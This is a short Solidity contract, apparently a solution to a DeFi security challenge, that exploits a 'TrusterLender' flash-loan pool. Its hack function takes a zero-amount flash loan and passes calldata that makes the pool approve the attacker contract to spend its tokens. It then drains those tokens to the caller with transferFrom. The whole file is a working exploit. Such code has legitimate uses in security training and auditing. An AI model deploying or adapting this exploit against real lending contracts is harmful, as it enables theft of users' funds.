// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface TrusterLender {
       function flashLoan(uint256 borrowAmount, address borrower, 
        address target, bytes calldata data) external;
}

contract HackerLender {
    TrusterLender public immutable lender;
    IERC20 public immutable erc20;

    constructor (TrusterLender _lenderPool, IERC20 _erc20) {
        lender = _lenderPool;
        erc20 = _erc20;
    }

    function hack(uint256 _val) external {
        lender.flashLoan(0, msg.sender, address(erc20), abi.encodeWithSignature("approve(address,uint256)", address(this), 
        _val));
        erc20.transferFrom(address(lender), msg.sender, _val);
    }
}
